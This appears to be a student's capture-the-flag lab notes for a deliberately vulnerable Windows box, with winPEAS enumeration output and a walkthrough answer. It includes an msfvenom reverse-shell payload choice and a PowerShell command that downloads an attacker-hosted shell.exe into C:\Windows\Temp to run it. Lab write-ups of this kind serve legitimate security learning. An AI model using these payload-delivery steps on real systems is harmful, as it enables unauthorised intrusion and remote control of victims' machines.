    W3SVC    REG_SZ    Software\Microsoft\W3SVC\CurrentVersion                                                   
                                                                                                                 
Looking inside HKCU\Software\TightVNC\Server                                                                     
Looking inside HKCU\Software\SimonTatham\PuTTY\Sessions                                                          
Looking inside HKCU\Software\OpenSSH\Agent\Keys                 


8/3/2019, 10:43:23 AM  

not appears to me Original Install Date prolly is another version winpeas

c:\Windows\Temp>.\winpeas.bat
            *((,.,/((((((((((((((((((((/,  */               
     ,/*,..*(((((((((((((((((((((((((((((((((,           
   ,*/((((((((((((((((((/,  .*//((//**, .*((((((*       
   ((((((((((((((((* *****,,,/########## .(* ,((((((   
   (((((((((((/* ******************/####### .(. ((((((
   ((((((..******************/@@@@@/***/######* /((((((
   ,,..**********************@@@@@@@@@@(***,#### ../(((((
   , ,**********************#@@@@@#@@@@*********##((/ /((((
   ..(((##########*********/#@@@@@@@@@/*************,,..((((
   .(((################(/******/@@@@@#****************.. /((
   .((########################(/************************..*(
   .((#############################(/********************.,(
   .((##################################(/***************..(
   .((######################################(************..(
   .((######(,.***.,(###################(..***(/*********..(
  .((######*(#####((##################((######/(********..(
   .((##################(/**********(################(**...(
   .(((####################/*******(###################.((((  
   .(((((############################################/  /((
   ..(((((#########################################(..(((((.
   ....(((((#####################################( .((((((.
   ......(((((#################################( .(((((((.
   (((((((((. ,(############################(../(((((((((.
       (((((((((/,  ,####################(/..((((((((((.
             (((((((((/,.  ,*//////*,. ./(((((((((((.
                (((((((((((((((((((((((((((/"
                       by carlospolop
ECHO is off.
Advisory: winpeas should be used for authorized penetration testing and/or educational purposes only.Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission.
ECHO is off.
_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [*] BASIC SYSTEM INFO <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] WINDOWS OS <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
[i] Check for vulnerabilities for the OS version with the applied patches
  [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#kernel-exploits
Host Name:                 HACKPARK
OS Name:                   Microsoft Windows Server 2012 R2 Standard Evaluation
OS Version:                6.3.9600 N/A Build 9600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00252-10000-00000-AA228
Original Install Date:     8/3/2019, 10:43:23 AM


```


Once we have established this we will use winPEAS to enumerate the system for potential vulnerabilities, before using this information to escalate to Administrator.


Now we can generate a more stable shell using msfvenom, instead of using a meterpreter, This time let's set our payload to windows/shell_reverse_tcp



After generating our payload we need to pull this onto the box using powershell.

	Tip: It's common to find C:\Windows\Temp is world writable!

	powershell -c "Invoke-WebRequest -Uri 'ip/shell.exe' -OutFile 'C:\Windows\Temp\shell.exe'"



Now you know how to pull files from your machine to the victims machine, we can pull winPEAS.bat to the system using the same method! (You can find winPEAS [here](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASbat))

WinPeas is a great tool which will enumerate the system and attempt to recommend potential vulnerabilities that we can exploit. The part we are most interested in for this room is the running processes!

	Tip: You can execute these files by using .\filename.exe

Using winPeas, what was the Original Install time? (This is date and time)

*8/3/2019, 10:43:23 AM*





[[Alfred]]
